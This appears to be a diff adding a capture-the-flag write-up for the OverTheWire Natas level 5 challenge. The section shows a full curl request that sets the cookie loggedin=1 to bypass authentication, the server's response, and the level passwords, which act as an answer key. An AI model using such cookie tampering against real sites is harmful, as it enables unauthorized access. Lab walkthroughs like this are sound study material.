@@ -92,3 +92,48 @@ Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
 </body>
 </html>
 ```
+
+## 5->6
+- http://natas5.natas.labs.overthewire.org/
+- `natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned`
+- That `loggedin=0` in the Cookie field looked strange. Copied the command as `cURL` and ran instead with `loggedin=1` and got access.
+- But why did that work?
+
+> https://mayadevbe.me/posts/overthewire/natas/natas5/
+> In this level, we will talk about cookies, not those you can eat, but HTTP-Cookies. HTTP is the protocol I mentioned in the previous level. It is stateless, meaning no information about the session/previous requests is saved on the receivers/servers side. The client/browser saves session states and sends them with new requests. With HTTP the session information is stored in cookies, allowing the otherwise stateless protocol to store and transfer stateful information.
+> 
+> Cookies are sent with the HTTP headers. There are different types of cookies, for example, authentication cookies (for login) or tracking cookies. Since they are stored on the client side, the client can manipulate them depending on their content. It could be plain text, encoded, hashed or a special value only the server knows how to process. The different types are easier or harder to manipulate by the client.
+
+<img width="1511" alt="Screenshot 2025-05-30 at 7 21 30 PM" src="https://github.com/user-attachments/assets/59c5444c-2e01-4394-8773-0a4176fa3658" />
+
+```bash
+curl 'http://natas5.natas.labs.overthewire.org/' \
+  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
+  -H 'Accept-Language: en-US,en;q=0.9,es;q=0.8' \
+  -H 'Authorization: Basic bmF0YXM1OjBuMzVQa2dnQVBtMnpiRXBPVTgwMmMweDBNc24xVG9L' \
+  -H 'Cache-Control: max-age=0' \
+  -H 'Connection: keep-alive' \
+  -b '_ga=GA1.1.1067986793.1744421061; _ga_RD0K2239G0=GS2.1.s1748407711$o32$g1$t1748407894$j49$l0$h0; loggedin=1' \
+  -H 'Upgrade-Insecure-Requests: 1' \
+  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36' \
+> 
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas5", "pass": "0n35PkggAPm2zbEpOU802c0x0Msn1ToK" };</script></head>
+<body>
+<h1>natas5</h1>
+<div id="content">
+Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned</div>
+</body>
+</html>
+```
+
+Can also edit the Cookie directly via Dev Tools.
+<img width="1502" alt="Screenshot 2025-05-30 at 7 27 18 PM" src="https://github.com/user-attachments/assets/af811c78-9ea1-43c2-a48c-046c67da33d2" />
